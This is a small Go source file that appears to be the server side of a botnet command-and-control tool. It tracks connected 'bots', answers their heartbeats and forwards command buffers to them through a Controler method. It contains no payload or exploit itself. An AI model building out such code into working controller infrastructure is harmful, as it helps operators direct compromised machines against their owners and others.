package main

import (
	"github.com/Acey9/spring/common"
	"net"
	"time"
)

type Bot struct {
	uid      int
	conn     net.Conn
	version  byte
	powerful string
}

func NewBot(conn net.Conn, version byte, powerful string) *Bot {
	return &Bot{-1, conn, version, powerful}
}

func (bot *Bot) Handle() {

	clientList.AddClient(bot)
	defer clientList.DelClient(bot)

	heartbeat, err := common.Pack(common.HEARTBEAT, []byte("\x00"))
	if err != nil {
		return
	}

	sleep := time.Millisecond * time.Duration(1000)
	for {
		bot.conn.SetDeadline(time.Now().Add(180 * time.Second))
		pkt, err := common.ReadPacket(bot.conn)
		if err != nil {
			return
		}

		if pkt.Type == common.HEARTBEAT {
			err = common.WritePacket(bot.conn, heartbeat)
			if err != nil {
				return
			}
			time.Sleep(sleep)
		}
	}
}

func (bot *Bot) Controler(buf []byte) {
	sp.logger.Debug("send buf to bot:% X", buf[0:20])
	common.WritePacket(bot.conn, buf)
}
